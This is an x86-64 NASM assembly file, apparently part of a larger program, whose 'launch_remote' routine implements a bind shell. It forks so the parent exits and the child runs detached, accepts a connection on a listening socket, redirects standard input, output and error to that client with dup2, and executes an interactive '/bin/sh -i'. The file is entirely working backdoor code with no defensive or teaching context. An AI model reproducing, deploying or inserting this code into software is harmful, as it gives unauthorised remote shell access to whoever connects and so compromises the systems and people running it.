BITS 64

section .text
    global launch_remote
    extern  create_server
    extern  shell_port
    extern client_fd
    extern sock_fd
    extern serv
    extern family
    extern port
    extern addr
    extern zero
    extern servlen
    extern client
    extern cfamily
    extern cport
    extern caddr
    extern czero
    extern clen

launch_remote:
    xor     rdi, rdi
    call    create_server
    mov     edi, DWORD [sock_fd]
    mov     rsi, [shell_port]
    mov     DWORD [rsp], 0x10 ; sizeof(sockaddr_in)
    lea     rdx, [rsp]
    xor     eax, eax
    add     eax, 0x33 ; getsockname
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    je      child
    xor     edi, edi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
child:
    mov     edi, DWORD [sock_fd]
    lea     rsi, [rel client]
    lea     rdx, [rel clen]
    xor     eax, eax
    add     eax, 0x2b ; accept
    syscall
    mov     [client_fd], DWORD eax
    mov     edi, DWORD [client_fd]
    xor     esi, esi
    xor     eax, eax
    add     eax, 0x21 ; dup2
    syscall
    mov     edi, DWORD [client_fd]
    xor     esi, esi
    xor     eax, eax
    add     esi, 1
    add     eax, 0x21 ; dup2
    syscall
    mov     edi, DWORD [client_fd]
    xor     esi, esi
    xor     eax, eax
    add     esi, 2
    add     eax, 0x21 ; dup2
    syscall
    lea     rdi, [rel sh]
    lea     rsi, [rel args]
    xor     edx, edx
    xor     eax, eax
    add     rax, 0x3b ; execve
    syscall
    xor     edi, edi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
    ret

    sh: db "/bin/sh", 0
    i: db "-i", 0
    args: dq sh, i, 0
